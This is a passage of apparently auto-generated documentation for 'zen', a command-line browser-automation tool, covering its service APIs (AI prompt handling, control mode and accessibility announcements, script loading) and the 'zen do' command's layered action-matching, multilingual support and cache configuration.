extra_instructions: str | None = None,\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>base_prompt</code> (str): Base prompt template</li> <li><code>content</code> (str): Content to analyze</li> <li><code>target_lang</code> (str | None): Target language code (optional)</li> <li><code>extra_instructions</code> (str | None): Additional instructions to append (optional)</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Formatted prompt ready for AI tool</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nprompt = service.format_prompt(\n    base_prompt=\"Describe this page:\",\n    content=\"&lt;page content&gt;\",\n    target_lang=\"en\",\n    extra_instructions=\"Focus on accessibility\"\n)\n</code></pre>"},{"location":"api/services/#call_mods","title":"<code>call_mods()</code>","text":"<p>Call the mods AI tool with the given prompt.</p> <p>Signature: <pre><code>def call_mods(\n    self,\n    prompt: str,\n    timeout: float = 60.0,\n    additional_args: list[str] | None = None,\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>prompt</code> (str): Complete prompt to send to mods</li> <li><code>timeout</code> (float): Maximum time to wait for response in seconds</li> <li><code>additional_args</code> (list[str] | None): Additional CLI arguments for mods</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: AI response text</li> </ul> <p>Raises:</p> <ul> <li><code>SystemExit</code>: If mods call fails</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nresponse = service.call_mods(\n    \"Describe this page:\\n\\nPage content...\",\n    timeout=30.0\n)\n</code></pre>"},{"location":"api/services/#show_debug_prompt","title":"<code>show_debug_prompt()</code>","text":"<p>Display a formatted debug view of the prompt.</p> <p>Signature: <pre><code>def show_debug_prompt(self, prompt: str) -&gt; None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>prompt</code> (str): The prompt to display</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nservice.show_debug_prompt(\"Full prompt here...\")\n</code></pre>"},{"location":"api/services/#generate_description","title":"<code>generate_description()</code>","text":"<p>Generate an AI-powered page description.</p> <p>Signature: <pre><code>def generate_description(\n    self,\n    page_structure: str,\n    language_override: str | None = None,\n    debug: bool = False,\n) -&gt; str | None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>page_structure</code> (str): Extracted page structure (markdown format)</li> <li><code>language_override</code> (str | None): Optional language override</li> <li><code>debug</code> (bool): If True, show prompt instead of calling AI</li> </ul> <p>Returns:</p> <ul> <li><code>str | None</code>: AI-generated description or None if debug mode</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\ndescription = service.generate_description(\n    page_structure=\"# Main Heading\\n...\",\n    language_override=\"en\"\n)\n</code></pre>"},{"location":"api/services/#generate_summary","title":"<code>generate_summary()</code>","text":"<p>Generate an AI-powered article summary.</p> <p>Signature: <pre><code>def generate_summary(\n    self,\n    article: dict[str, Any],\n    language_override: str | None = None,\n    debug: bool = False,\n) -&gt; str | None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>article</code> (dict[str, Any]): Extracted article data (title, content, byline, lang)</li> <li><code>language_override</code> (str | None): Optional language override</li> <li><code>debug</code> (bool): If True, show prompt instead of calling AI</li> </ul> <p>Returns:</p> <ul> <li><code>str | None</code>: AI-generated summary or None if debug mode</li> </ul> <p>Example:</p> <pre><code>service = AIIntegrationService()\nsummary = service.generate_summary(\n    article={\n        \"title\": \"Article Title\",\n        \"content\": \"Article content...\",\n        \"lang\": \"en\"\n    }\n)\n</code></pre>"},{"location":"api/services/#global-functions_1","title":"Global Functions","text":""},{"location":"api/services/#get_ai_service","title":"<code>get_ai_service()</code>","text":"<p>Get the default AI integration service instance (singleton pattern).</p> <p>Signature: <pre><code>def get_ai_service(prompts_dir: Path | None = None) -&gt; AIIntegrationService\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>prompts_dir</code> (Path | None): Optional custom prompts directory</li> </ul> <p>Returns:</p> <ul> <li><code>AIIntegrationService</code>: Shared AIIntegrationService instance</li> </ul> <p>Example:</p> <pre><code>from zen.services.ai_integration import get_ai_service\n\nservice = get_ai_service()\ndescription = service.generate_description(page_structure)\n</code></pre>"},{"location":"api/services/#controlmanager","title":"ControlManager","text":"<p>Manages control mode state and notifications.</p> <p>Location: <code>zen/services/control_manager.py</code></p>"},{"location":"api/services/#purpose_2","title":"Purpose","text":"<ul> <li>Control mode state tracking</li> <li>Notification polling and handling</li> <li>Auto-restart logic</li> <li>Accessibility announcements coordination</li> </ul>"},{"location":"api/services/#class-controlnotification","title":"Class: <code>ControlNotification</code>","text":"<p>Represents a notification from the browser during control mode.</p> <pre><code>class ControlNotification:\n    def __init__(\n        self,\n        notification_type: str,\n        message: str,\n        data: dict[str, Any] | None = None\n    ):\n        \"\"\"Initialize a control notification.\"\"\"\n</code></pre> <p>Attributes:</p> <ul> <li><code>type</code> (str): Type of notification (e.g., \"refocus\")</li> <li><code>message</code> (str): Human-readable message</li> <li><code>data</code> (dict[str, Any]): Additional notification data</li> </ul> <p>Class Methods:</p> <pre><code>@classmethod\ndef from_dict(cls, data: dict[str, Any]) -&gt; ControlNotification:\n    \"\"\"Create notification from API response dictionary.\"\"\"\n</code></pre>"},{"location":"api/services/#class-controlmanager","title":"Class: <code>ControlManager</code>","text":"<p>Service for managing browser control mode state and notifications.</p> <pre><code>class ControlManager:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 8765):\n        \"\"\"Initialize the control manager.\"\"\"\n</code></pre> <p>Parameters:</p> <ul> <li><code>host</code> (str): Bridge server host</li> <li><code>port</code> (int): Bridge server port</li> </ul>"},{"location":"api/services/#methods_2","title":"Methods","text":""},{"location":"api/services/#check_notifications","title":"<code>check_notifications()</code>","text":"<p>Check for pending notifications from the browser.</p> <p>Signature: <pre><code>def check_notifications(self, timeout: float = 0.5) -&gt; list[ControlNotification]\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>timeout</code> (float): Request timeout in seconds</li> </ul> <p>Returns:</p> <ul> <li><code>list[ControlNotification]</code>: List of notifications (empty if none available or on error)</li> </ul> <p>Example:</p> <pre><code>manager = ControlManager()\nnotifications = manager.check_notifications()\nfor notif in notifications:\n    print(notif.message)\n</code></pre>"},{"location":"api/services/#handle_refocus_notification","title":"<code>handle_refocus_notification()</code>","text":"<p>Handle a refocus notification by announcing it.</p> <p>Signature: <pre><code>def handle_refocus_notification(\n    self,\n    notification: ControlNotification,\n    speak_enabled: bool = False,\n    speak_command: str = \"say\",\n) -&gt; None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>notification</code> (ControlNotification): The refocus notification</li> <li><code>speak_enabled</code> (bool): If True, use text-to-speech</li> <li><code>speak_command</code> (str): Command to use for TTS (default: \"say\" for macOS)</li> </ul> <p>Example:</p> <pre><code>manager = ControlManager()\nnotifications = manager.check_notifications()\nfor notif in notifications:\n    if notif.type == \"refocus\":\n        manager.handle_refocus_notification(notif, speak_enabled=True)\n</code></pre>"},{"location":"api/services/#announce_accessible_name","title":"<code>announce_accessible_name()</code>","text":"<p>Announce the accessible name of a focused element via text-to-speech.</p> <p>Signature: <pre><code>def announce_accessible_name(\n    self,\n    accessible_name: str,\n    role: str | None = None,\n    announce_role: bool = False,\n    speak_command: str = \"say\",\n) -&gt; None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>accessible_name</code> (str): The accessible name to announce</li> <li><code>role</code> (str | None): Element role (e.g., \"button\", \"link\")</li> <li><code>announce_role</code> (bool): If True, prepend role to announcement</li> <li><code>speak_command</code> (str): Command to use for TTS (default: \"say\" for macOS)</li> </ul> <p>Example:</p> <pre><code>manager = ControlManager()\nmanager.announce_accessible_name(\n    \"Submit\",\n    role=\"button\",\n    announce_role=True\n)\n# Speaks: \"button, Submit\"\n</code></pre>"},{"location":"api/services/#check_needs_restart","title":"<code>check_needs_restart()</code>","text":"<p>Check if control mode needs to be restarted (e.g., after navigation).</p> <p>Signature: <pre><code>def check_needs_restart(self, result: dict[str, Any]) -&gt; bool\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>result</code> (dict[str, Any]): Execution result from bridge</li> </ul> <p>Returns:</p> <ul> <li><code>bool</code>: True if restart is needed</li> </ul> <p>Example:</p> <pre><code>manager = ControlManager()\nresult = executor.execute(code)\nif manager.check_needs_restart(result):\n    # Reinitialize control mode\n    pass\n</code></pre>"},{"location":"api/services/#format_restart_message","title":"<code>format_restart_message()</code>","text":"<p>Get the restart message to display.</p> <p>Signature: <pre><code>def format_restart_message(self, verbose: bool = False) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>verbose</code> (bool): If True, include more details</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Formatted restart message</li> </ul> <p>Example:</p> <pre><code>manager = ControlManager()\nmsg = manager.format_restart_message(verbose=True)\nprint(msg)  # \"\ud83d\udd04 Reinitializing control mode after navigation (verbose mode)...\"\n</code></pre>"},{"location":"api/services/#format_success_message","title":"<code>format_success_message()</code>","text":"<p>Get the success message after restart.</p> <p>Signature: <pre><code>def format_success_message(self, verbose: bool = False) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>verbose</code> (bool): If True, include more details</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Formatted success message</li> </ul> <p>Example:</p> <pre><code>manager = ControlManager()\nmsg = manager.format_success_message(verbose=True)\nprint(msg)  # \"\u2705 Control restored successfully!\"\n</code></pre>"},{"location":"api/services/#global-functions_2","title":"Global Functions","text":""},{"location":"api/services/#get_control_manager","title":"<code>get_control_manager()</code>","text":"<p>Get the default control manager instance (singleton pattern).</p> <p>Signature: <pre><code>def get_control_manager(\n    host: str = \"127.0.0.1\",\n    port: int = 8765,\n) -&gt; ControlManager\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>host</code> (str): Bridge server host</li> <li><code>port</code> (int): Bridge server port</li> </ul> <p>Returns:</p> <ul> <li><code>ControlManager</code>: Shared ControlManager instance</li> </ul> <p>Example:</p> <pre><code>from zen.services.control_manager import get_control_manager\n\nmanager = get_control_manager()\nnotifications = manager.check_notifications()\n</code></pre>"},{"location":"api/services/#scriptloader","title":"ScriptLoader","text":"<p>Loads and caches JavaScript scripts from the zen/scripts/ directory.</p> <p>Location: <code>zen/services/script_loader.py</code></p>"},{"location":"api/services/#purpose_3","title":"Purpose","text":"<ul> <li>Load JavaScript files from zen/scripts/ directory</li> <li>Cache scripts in memory for performance</li> <li>Handle template substitution (placeholders)</li> <li>Provide both sync and async interfaces</li> </ul>"},{"location":"api/services/#class-scriptloader","title":"Class: <code>ScriptLoader</code>","text":"<p>Service for loading and caching JavaScript scripts.</p> <pre><code>class ScriptLoader:\n    def __init__(self, scripts_dir: Path | None = None):\n        \"\"\"Initialize script loader.\"\"\"\n</code></pre> <p>Parameters:</p> <ul> <li><code>scripts_dir</code> (Path | None): Directory containing JavaScript files. If None, uses zen/scripts/</li> </ul>"},{"location":"api/services/#methods_3","title":"Methods","text":""},{"location":"api/services/#get_script_path","title":"<code>get_script_path()</code>","text":"<p>Get full path to a script file.</p> <p>Signature: <pre><code>def get_script_path(self, script_name: str) -&gt; Path\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script (e.g., \"control.js\")</li> </ul> <p>Returns:</p> <ul> <li><code>Path</code>: Full path to script</li> </ul> <p>Raises:</p> <ul> <li><code>FileNotFoundError</code>: If script does not exist</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\npath = loader.get_script_path(\"control.js\")\n</code></pre>"},{"location":"api/services/#load_script_sync","title":"<code>load_script_sync()</code>","text":"<p>Load script synchronously (for CLI use).</p> <p>Signature: <pre><code>def load_script_sync(\n    self,\n    script_name: str,\n    use_cache: bool = True\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script file (e.g., \"control.js\")</li> <li><code>use_cache</code> (bool): If True, use cached version if available</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Script contents as string</li> </ul> <p>Raises:</p> <ul> <li><code>FileNotFoundError</code>: If script does not exist</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nscript = loader.load_script_sync(\"control.js\")\n</code></pre>"},{"location":"api/services/#load_script_async","title":"<code>load_script_async()</code>","text":"<p>Load script asynchronously (for server use).</p> <p>Signature: <pre><code>async def load_script_async(\n    self,\n    script_name: str,\n    use_cache: bool = True\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script file (e.g., \"control.js\")</li> <li><code>use_cache</code> (bool): If True, use cached version if available</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Script contents as string</li> </ul> <p>Raises:</p> <ul> <li><code>FileNotFoundError</code>: If script does not exist</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nscript = await loader.load_script_async(\"control.js\")\n</code></pre>"},{"location":"api/services/#substitute_placeholders","title":"<code>substitute_placeholders()</code>","text":"<p>Substitute placeholders in script with actual values.</p> <p>Signature: <pre><code>def substitute_placeholders(\n    self,\n    script_content: str,\n    placeholders: dict[str, Any]\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_content</code> (str): Original script content</li> <li><code>placeholders</code> (dict[str, Any]): Dictionary mapping placeholder names to values</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Script with placeholders replaced</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nscript = \"const action = 'ACTION_PLACEHOLDER';\"\nresult = loader.substitute_placeholders(\n    script,\n    {\"ACTION_PLACEHOLDER\": \"start\"}\n)\n# Returns: \"const action = 'start';\"\n</code></pre>"},{"location":"api/services/#load_with_substitution_sync","title":"<code>load_with_substitution_sync()</code>","text":"<p>Load script and substitute placeholders (sync).</p> <p>Signature: <pre><code>def load_with_substitution_sync(\n    self,\n    script_name: str,\n    placeholders: dict[str, Any],\n    use_cache: bool = False\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script file</li> <li><code>placeholders</code> (dict[str, Any]): Placeholder substitutions</li> <li><code>use_cache</code> (bool): If True, use cached base script</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Script with placeholders replaced</li> </ul> <p>Note:</p> <p>Scripts with substitutions are not cached (different per request)</p> <p>Example:</p> <pre><code>loader = ScriptLoader()\nscript = loader.load_with_substitution_sync(\n    \"cookies.js\",\n    {\"ACTION_PLACEHOLDER\": \"get\", \"NAME_PLACEHOLDER\": \"session_id\"}\n)\n</code></pre>"},{"location":"api/services/#load_with_substitution_async","title":"<code>load_with_substitution_async()</code>","text":"<p>Load script and substitute placeholders (async).</p> <p>Signature: <pre><code>async def load_with_substitution_async(\n    self,\n    script_name: str,\n    placeholders: dict[str, Any],\n    use_cache: bool = False\n) -&gt; str\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script file</li> <li><code>placeholders</code> (dict[str, Any]): Placeholder substitutions</li> <li><code>use_cache</code> (bool): If True, use cached base script</li> </ul> <p>Returns:</p> <ul> <li><code>str</code>: Script with placeholders replaced</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nscript = await loader.load_with_substitution_async(\n    \"cookies.js\",\n    {\"ACTION_PLACEHOLDER\": \"get\"}\n)\n</code></pre>"},{"location":"api/services/#preload_script","title":"<code>preload_script()</code>","text":"<p>Preload script into cache (sync).</p> <p>Signature: <pre><code>def preload_script(self, script_name: str) -&gt; None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script to preload</li> </ul> <p>Raises:</p> <ul> <li><code>FileNotFoundError</code>: If script does not exist</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nloader.preload_script(\"control.js\")  # Now cached\n</code></pre>"},{"location":"api/services/#preload_script_async","title":"<code>preload_script_async()</code>","text":"<p>Preload script into cache (async).</p> <p>Signature: <pre><code>async def preload_script_async(self, script_name: str) -&gt; None\n</code></pre></p> <p>Parameters:</p> <ul> <li><code>script_name</code> (str): Name of script to preload</li> </ul> <p>Raises:</p> <ul> <li><code>FileNotFoundError</code>: If script does not exist</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nawait loader.preload_script_async(\"control.js\")\n</code></pre>"},{"location":"api/services/#clear_cache","title":"<code>clear_cache()</code>","text":"<p>Clear the script cache.</p> <p>Signature: <pre><code>def clear_cache(self) -&gt; None\n</code></pre></p> <p>Example:</p> <pre><code>loader = ScriptLoader()\nloader.clear_cache()\n</code></pre>"},{"location":"api/services/#get_cached_scripts","title":"<code>get_cached_scripts()</code>","text":"<p>Get list of cached script names.</p> <p>Signature: <pre><code>def get_cached_scripts(self) -&gt; list[str]\n</code></pre></p> <p>Returns:</p> <ul> <li><code>list[str]</code>: List of script names currently in cache</li> </ul> <p>Example:</p> <pre><code>loader = ScriptLoader()\nloader.preload_script(\"control.js\")\ncached = loader.get_cached_scripts()\nprint(cached)  # [\"control.js\"]\n</code></pre>"},{"location":"api/services/#integration-patterns","title":"Integration Patterns","text":""},{"location":"api/services/#using-multiple-services-together","title":"Using Multiple Services Together","text":"<p>Services are designed to work together. Here's a common pattern:</p> <pre><code>from zen.services.bridge_executor import get_executor\nfrom zen.services.ai_integration import get_ai_service\nfrom zen.services.script_loader import ScriptLoader\n\n# Get singleton instances\nexecutor = get_executor()\nai_service = get_ai_service()\nloader = ScriptLoader()\n\n# Load and execute script\nscript = loader.load_script_sync(\"extract_page_structure.js\")\nresult = executor.execute(script, timeout=30.0)\n\n# Check result\nexecutor.check_result_ok(result)\n\n# Generate AI description\npage_structure = result[\"result\"]\ndescription = ai_service.generate_description(page_structure)\nprint(description)\n</code></pre>"},{"location":"api/services/#error-handling-pattern","title":"Error Handling Pattern","text":"<p>All services follow consistent error handling:</p> <pre><code>from zen.services.bridge_executor import get_executor\n\nexecutor = get_executor()\n\n# Ensure server running (exits if not)\nexecutor.ensure_server_running()\n\n# Execute with retry\nresult = executor.execute(\n    \"document.title\",\n    timeout=10.0,\n    retry_on_timeout=True\n)\n\n# Check result (exits if error)\nexecutor.check_result_ok(result)\n\n# Use result\nprint(result[\"result\"])\n</code></pre>"},{"location":"api/services/#dependency-injection","title":"Dependency Injection","text":"<p>Services accept dependencies for testability:</p> <pre><code>from pathlib import Path\nfrom zen.services.script_loader import ScriptLoader\n\n# Custom scripts directory for testing\nloader = ScriptLoader(scripts_dir=Path(\"/custom/scripts\"))\nscript = loader.load_script_sync(\"test.js\")\n</code></pre>"},{"location":"api/services/#see-also","title":"See Also","text":"<ul> <li>Commands Reference</li> <li>Models Reference</li> <li>Protocol Specification</li> <li>Architecture Guide</li> </ul>"},{"location":"assets/images/","title":"Images Directory","text":"<p>This directory is reserved for documentation images and screenshots.</p>"},{"location":"assets/images/#usage","title":"Usage","text":"<p>Place screenshots, diagrams, and other visual assets here to be referenced in the documentation.</p>"},{"location":"assets/images/#naming-convention","title":"Naming Convention","text":"<ul> <li>Use descriptive names: <code>installation-flow.png</code>, <code>architecture-diagram.png</code></li> <li>Use lowercase with hyphens</li> <li>Group related images with prefixes: <code>cli-eval-example.png</code>, <code>cli-repl-example.png</code></li> </ul>"},{"location":"assets/images/#supported-formats","title":"Supported Formats","text":"<ul> <li>PNG (preferred for screenshots)</li> <li>JPEG (for photos)</li> <li>SVG (for diagrams and icons)</li> <li>GIF (for animations)</li> </ul>"},{"location":"assets/images/#size-guidelines","title":"Size Guidelines","text":"<ul> <li>Keep file sizes reasonable (&lt; 500KB per image)</li> <li>Optimize images before committing</li> <li>Use appropriate resolution (2x for retina displays)</li> </ul>"},{"location":"assets/images/#examples","title":"Examples","text":"<p>Future screenshots might include:</p> <ul> <li>Browser userscript manager setup</li> <li>Terminal command outputs</li> <li>WebSocket connection status</li> <li>Control mode in action</li> <li>REPL session examples</li> </ul>"},{"location":"commands/do/","title":"zen do - Smart Action Matching","text":"<p>The <code>zen do</code> command provides intelligent action matching for web automation using natural language. It uses a multi-layered waterfall approach to match your intent with page elements, minimizing AI calls and maximizing speed.</p>"},{"location":"commands/do/#quick-start","title":"Quick Start","text":"<pre><code># Navigate to a page\nzen do \"go to homepage\"\n\n# Click a button\nzen do \"click login button\"\n\n# Search\nzen do \"search\"\n\n# With flags\nzen do \"about us\" --force-ai  # Force AI matching\nzen do \"contact\" --no-execute  # Show match without executing\nzen do \"help\" --debug  # Show AI prompt instead of executing\n</code></pre>"},{"location":"commands/do/#how-it-works","title":"How It Works","text":"<p>The <code>zen do</code> command uses an intelligent waterfall approach that tries multiple strategies before falling back to AI:</p> <pre><code>User Action\n    \u2193\n1. CHECK CACHE \u2713 (instant, no AI)\n   \u2193 (miss)\n2. ANALYZE PAGE (extract all actionable elements)\n   \u2193\n3. TRY LITERAL MATCHING \u2713 (text/URL matching)\n   \u2193 (no match)\n4. TRY COMMON ACTIONS \u2713 (home, login, search, etc.)\n   \u2193 (no match)\n5. TRY ADVANCED MATCHING \u2713 (fuzzy text, synonyms)\n   \u2193 (no match)\n6. USE AI \ud83e\udd16 (last resort)\n   \u2193\nEXECUTE ACTION &amp; CACHE RESULT\n</code></pre>"},{"location":"commands/do/#phase-1-cache-lookup","title":"Phase 1: Cache Lookup","text":"<p>What it does: Checks if you've performed this action on this URL before.</p> <p>Benefits: - Instant execution (no page analysis or AI needed) - Works even if page structure changed slightly (80% similarity threshold) - Gets smarter over time</p> <p>Example: <pre><code># First time - uses AI\nzen do \"go to about page\"  # \u2192 [AI] matches and caches\n\n# Second time - uses cache\nzen do \"go to about page\"  # \u2192 [CACHED] instant!\n</code></pre></p> <p>Cache validation: - Checks page similarity (default: 80% threshold) - Verifies cache freshness (default: 24 hours) - Falls back to other methods if page changed too much</p>"},{"location":"commands/do/#phase-2-literal-matching","title":"Phase 2: Literal Matching","text":"<p>What it does: Finds elements whose text directly contains your action words.</p> <p>Benefits: - Fast (no AI needed) - Reliable for obvious matches - Case-insensitive</p> <p>Examples:</p> Your Action Element Text Match Score Result \"about us\" \"About Us\" 100% \u2713 Perfect match \"contact\" \"Contact Us\" 100% \u2713 Perfect match \"pricing\" \"View Pricing Plans\" 100% \u2713 Perfect match \"blog posts\" \"Blog\" 50% Fall back to AI <p>How it works: 1. Normalizes your action (removes filler words) 2. Compares with element text 3. Calculates word overlap percentage 4. Also checks href attributes for links</p> <p>Normalization removes filler words: - Action verbs: go, click, open, navigate, etc. - Articles: the, a, an, to, at, in, etc. - UI types: page, button, link, field, etc.</p> <pre><code>\"Please click the login button\" \u2192 \"login\"\n\"Go to the About Us page\" \u2192 \"about us\"\n\"Navigate to settings\" \u2192 \"settings\"\n</code></pre>"},{"location":"commands/do/#phase-3-common-actions","title":"Phase 3: Common Actions","text":"<p>What it does: Matches against a dictionary of frequent actions (home, login, search, etc.)</p> <p>Benefits: - Handles variations (\"login\" vs \"sign in\" vs \"log in\") - Checks multiple attributes (href, text, aria-labels, types) - Works across different site designs</p> <p>Supported actions: - home: /, /home, /index, \"home\", \"homepage\" - login: /login, /signin, \"login\", \"sign in\", \"log in\" - logout: /logout, /signout, \"logout\", \"sign out\" - signup: /signup, /register, \"sign up\", \"register\", \"join\" - search: search inputs, \"search\", \"find\" - contact: /contact, /support, \"contact us\", \"support\" - about: /about, \"about us\", \"who we are\" - products: /products, /shop, /store, \"products\", \"catalog\" - pricing: /pricing, /plans, \"pricing\", \"plans\" - blog: /blog, /news, \"blog\", \"articles\" - cart: /cart, /basket, \"cart\", \"shopping cart\" - settings: /settings, /preferences, \"settings\", \"preferences\" - profile: /profile, /account, \"profile\", \"my account\" - help: /help, /faq, \"help\", \"support\", \"faq\"</p> <p>Example: <pre><code># These all match the same action\nzen do \"login\"\nzen do \"sign in\"\nzen do \"log in\"\nzen do \"authenticate\"\n</code></pre></p>"},{"location":"commands/do/#phase-4-advanced-matching","title":"Phase 4: Advanced Matching","text":"<p>Fuzzy Matching: Handles typos and variations. <pre><code>zen do \"abuot us\"  # Matches \"about us\" (Levenshtein distance)\nzen do \"contct\"    # Matches \"contact\"\n</code></pre></p> <p>Synonym Matching: Expands action with synonyms. <pre><code># \"catalog\" is synonym of \"products\"\nzen do \"catalog\"   # Finds \"Products\" link\n\n# \"main page\" is synonym of \"home\"\nzen do \"main page\" # Finds \"Home\" link\n</code></pre></p> <p>Synonyms: - home \u2192 homepage, main, index, start - login \u2192 signin, authenticate - search \u2192 find, lookup, query - products \u2192 catalog, shop, store, items - settings \u2192 preferences, config, options</p>"},{"location":"commands/do/#phase-5-ai-matching","title":"Phase 5: AI Matching","text":"<p>What it does: Uses AI (via <code>mods</code>) to understand your intent and find the best match.</p> <p>When it's used: - No automatic match found (&lt; 80% confidence) - Complex or ambiguous actions - <code>--force-ai</code> flag used</p> <p>Benefits: - Understands natural language - Handles complex intents - Provides reasoning for matches</p> <p>Example output: <pre><code>zen do \"I want to learn about their long-term strategy\"\n\nInterpretation: User wants information about long-term strategy\nFound 2 matching action(s):\n\n1. zen-action-012 (probability: 95%)\n   Type: link\n   Text: ESA Strategy 2040\n   Reasoning: Direct match for 'long-term strategy'\n\nHigh confidence match! Executing action... [AI]\n</code></pre></p>"},{"location":"commands/do/#multilingual-support","title":"Multilingual Support","text":"<p>The <code>zen do</code> command supports 5 languages with automatic language detection:</p> <ul> <li>\ud83c\uddec\ud83c\udde7 English (en)</li> <li>\ud83c\uddf3\ud83c\uddf1 Dutch (nl)</li> <li>\ud83c\uddeb\ud83c\uddf7 French (fr)</li> <li>\ud83c\udde9\ud83c\uddea German (de)</li> <li>\ud83c\uddea\ud83c\uddf8 Spanish (es)</li> </ul>"},{"location":"commands/do/#how-it-works_1","title":"How It Works","text":"<ol> <li>Automatic Detection: Reads page language from <code>&lt;html lang=\"...\"&gt;</code> attribute</li> <li>Smart Normalization: Removes filler words in the detected language</li> <li>Multilingual Matching: Tries action patterns in the page's language first</li> <li>Fallback: Always includes English as a fallback</li> </ol>"},{"location":"commands/do/#examples","title":"Examples","text":"<p>Dutch Page: <pre><code>zen do \"Ga naar de inloggen pagina\"\n# Normalizes: \"inloggen\"\n# Matches: Dutch \"inloggen\" pattern \u2192 finds login link\n</code></pre></p> <p>French Page: <pre><code>zen do \"Aller \u00e0 la page de connexion\"\n# Normalizes: \"connexion\"\n# Matches: French \"connexion\" pattern \u2192 finds login link\n</code></pre></p> <p>German Page: <pre><code>zen do \"Gehen Sie zur Anmeldeseite\"\n# Normalizes: \"anmeldeseite\"\n# Matches: German \"anmelden\" pattern \u2192 finds login link\n</code></pre></p> <p>Spanish Page: <pre><code>zen do \"Ir a la p\u00e1gina de inicio de sesi\u00f3n\"\n# Normalizes: \"inicio sesi\u00f3n\"\n# Matches: Spanish \"iniciar sesi\u00f3n\" pattern \u2192 finds login link\n</code></pre></p> <p>English Works Everywhere: <pre><code># Even on non-English pages, English commands work!\nzen do \"login\"\nzen do \"go to homepage\"\nzen do \"click search\"\n</code></pre></p>"},{"location":"commands/do/#supported-actions-multilingual","title":"Supported Actions (Multilingual)","text":"<p>The following common actions are available in all 5 languages:</p> <ul> <li>Navigation: home, about, contact, help, search, news, privacy</li> <li>Authentication: login, logout, register</li> <li>Account: profile, settings</li> <li>E-commerce: cart, checkout</li> </ul>"},{"location":"commands/do/#adding-new-languages","title":"Adding New Languages","text":"<p>Languages are configured in JSON files at <code>zen/i18n/</code>: - <code>filler_words.json</code> - Words to remove during normalization - <code>common_actions.json</code> - Common action patterns with translations</p> <p>See the i18n README for contribution guidelines.</p>"},{"location":"commands/do/#execution-behavior","title":"Execution Behavior","text":""},{"location":"commands/do/#auto-execute-score-100","title":"Auto-Execute (Score \u2265 100%)","text":"<p>Perfect matches execute immediately:</p> <pre><code>zen do \"about us\"\n\n\u2713 Found literal match (score: 100%) [LITERAL]\nPerfect match! Executing action... [LITERAL]\n\u2713 Action executed successfully!\n  Navigated to: /about\n  Text: About Us\n</code></pre>"},{"location":"commands/do/#confirm-80-score-100","title":"Confirm (80% \u2264 Score &lt; 100%)","text":"<p>Good matches ask for confirmation:</p> <pre><code>zen do \"help page\"\n\n\u2713 Found literal match (score: 85%) [LITERAL]\nFound match (confidence: 85%) [LITERAL]\n  \u2192 link: Help &amp; Support\n  \u2192 URL: /help\n\nExecute action? [Y/n]:\n</code></pre>"},{"location":"commands/do/#fallback-score-80","title":"Fallback (Score &lt; 80%)","text":"<p>Low confidence falls back to next strategy:</p> <pre><code>\u2713 Found literal match (score: 65%)\nMatch confidence too low (65%), falling back to AI...\n</code></pre>"},{"location":"commands/do/#configuration","title":"Configuration","text":"<p>Edit <code>config.json</code> to customize cache behavior:</p> <pre><code>{\n  \"cache\": {\n    \"enabled\": true,\n    \"ttl_hours\": 24,\n    \"max_urls\": 100,\n    \"max_actions_per_url\": 10,\n    \"max_total_actions\": 1000,\n    \"similarity_threshold\": 0.8,\n    \"literal_match_threshold\": 0.8,\n    \"use_fuzzy_matching\": true,\n    \"max_fuzzy_distance\": 2\n  }\n}\n</code></pre>"},{"location":"commands/do/#configuration-options","title":"Configuration Options","text":"Option Default Description <code>enabled</code> <code>true</code> Enable/disable caching <code>ttl_hours</code> <code>24</code> Cache lifetime in hours <code>max_urls</code> <code>100</code> Maximum URLs to cache <code>max_actions_per_url</code> <code>10</code> Max actions per URL <code>max_total_actions</code> <code>1000</code> Total action limit <code>similarity_threshold</code> <code>0.8</code> Page similarity threshold (0.0-1.0) <code>literal_match_threshold</code> <code>0.8</code> Literal match confidence threshold <code>use_fuzzy_matching</code> <code>true</code> Enable fuzzy text matching <code>max_fuzzy_distance</code> <code>2</code> Max Levenshtein distance for fuzzy matches"},{"location":"commands/do/#command-options","title":"Command Options","text":""},{"location":"commands/do/#-force-ai","title":"<code>--force-ai</code>","text":"<p>Force AI matching, bypassing cache and automatic matching.</p> <pre><code>zen do \"about us\" 